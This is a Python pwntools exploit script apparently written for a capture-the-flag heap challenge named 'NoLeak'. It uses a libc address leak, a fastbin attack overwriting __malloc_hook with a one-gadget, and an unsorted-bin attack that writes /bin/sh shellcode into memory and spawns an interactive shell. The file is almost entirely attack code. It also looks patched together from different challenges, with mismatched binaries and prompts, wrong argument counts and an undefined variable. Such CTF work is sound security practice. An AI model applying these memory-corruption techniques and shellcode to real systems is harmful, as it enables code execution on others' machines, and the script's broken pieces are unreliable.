#/lib/x86_64-linux-gnu/libc.so.6
#!/usr/bin/env python
#-*- coding:utf-8 -*-
#/proc/sys/kernel/randomize_va_space
from pwn import *

DEBUG = True
if DEBUG:
	io = process("./NoLeak")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./NoLeak")
else:
	io = remote("pwn2.jarvisoj.com","9887")
	libc = ELF("./libc-2.19.so")
	r = ROP(libc)
	elf = ELF("./itemboard")
	malloc_hook = 0x3BE740+0x10
	offset = 0x3BE000

def Add(size,data):
	io.sendlineafter("Your choice :","1")
	io.sendlineafter("Size: ",str(size))
	io.sendafter("Data: ",data)
	io.recvuntil("Wellcome To the Heap World\n")

def search(size,sentence,delete):
	io.sendlineafter("3: Quit\n","1")
	io.sendlineafter("Enter the word size:\n",str(size))
	io.sendafter("Enter the word:\n",sentence)
	io.recvuntil("Delete this sentence (y/n)?\n")
	if delete == "y":
		io.sendline(delete)
		return io.recvuntil("Deleted!\n")
	else:
		io.sendline(delete)
		return io.recvuntil("1: Search with a word\n")

def list():
	io.sendlineafter("choose:\n","2")
	return io.recvuntil("1.Add a item\n")

def show(index):
	io.sendlineafter("choose:\n","3")
	io.sendlineafter("Which item?\n",str(index))
	return io.recvuntil("1.Add a item\n")

def change(index,content):
	io.sendlineafter("Your choice :","3")
	io.sendlineafter("Index: ",str(index))
	io.sendlineafter("Size: ",str(len(content)))
	io.sendafter("Data: ",content)
	io.recvuntil("Wellcome To the Heap World\n")

def free(index):
	io.sendlineafter("Your choice :","2")
	io.sendlineafter("Index: ",str(index))

def leak():
	Add(0x100*"a")
	Add(0x100*"b")
	free(1)
	search(0x1,"m","y")
	print search(0x1,"\x00","n")
	libc = show(0).split("Description:")[1][:6] + "\x00\x00"
	leak_addr = u64(show(0).split("Description:")[1][:6]+"\x00\x00")
	#print hex(info)
	print hex(leak_addr)
	if debug:
		leak_addr2 = leak_addr - offset
	else:
		leak_addr2 = leak_addr - leak_addr%0x1000 - offset
	log.success("libc_base:" + hex(leak_addr2))
	return leak_addr2, leak_addr

def fastbinattack(libc_base):
	malloc_hook = libc.symbols["__malloc_hook"] + libc_base
	print hex(libc.symbols["__malloc_hook"])
	system_addr = libc.symbols["system"] + libc_base
	log.info("malloc_hook @" + hex(malloc_hook))
	log.info("system_addr @" + hex(system_addr))
	Add(0x40,0x40*"a")
	Add(0x60,0x60*"a")#7
	Add(0x60,0x60*"a")#8
	free(7)
	change(6, 0x60 + 0x10 + 0x10, 'a' * 0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 27 - 0x8) + p64(0))

	Add(0x60,0x60*"a")
    # free_hook
	Add(0x60,"a")
    #		   memalign_hook     realloc_hook      malloc hook
	payload = 3 * 'a' + p64(0)	  + p64(0)	+ p64(libc_base + 0x45216)#0x4526a)
	change(8, len(payload), payload)
	io.sendlineafter("Your choice:","2")
	io.sendafter("Please enter the length of servant name:",str(0x100))

def unsortedbinsattack_my():
	buf_base = 0x0000000000601040
	sc = asm(shellcraft.sh())
	Add(0x68,"a"*0x10)
	Add(0x80,"b"*0x10)
	Add(0x80,"c"*0x10)
	free(1)
	target = 0x601040 + 7*0x08
	#info = 0x7f5c2f194b78
	#__malloc_hook = 0x7f5c2f194b10
	change(1,p64(target-0x10)+p64(target-0x10))
	free(0)
	Add(0x80,"d"*0x10)
	change(0,p64(0x601075))
	Add(0x68,"eeee")
	Add(0x68,"f"*3 + p64(0x601070))
	change(9,p64(0x601090) + "\x10")
	sc_addr = 0x601070
	change(7,p64(sc_addr))
	change(9,'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05')
	#io.sendlineafter("Your choice :","1")
	#io.sendlineafter("Size: ","1")
	

sc = '\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
context.log_level = "debug"
gdb.attach(io,"b *0x0000000000400757")
unsortedbinsattack_my()
io.interactive()
	
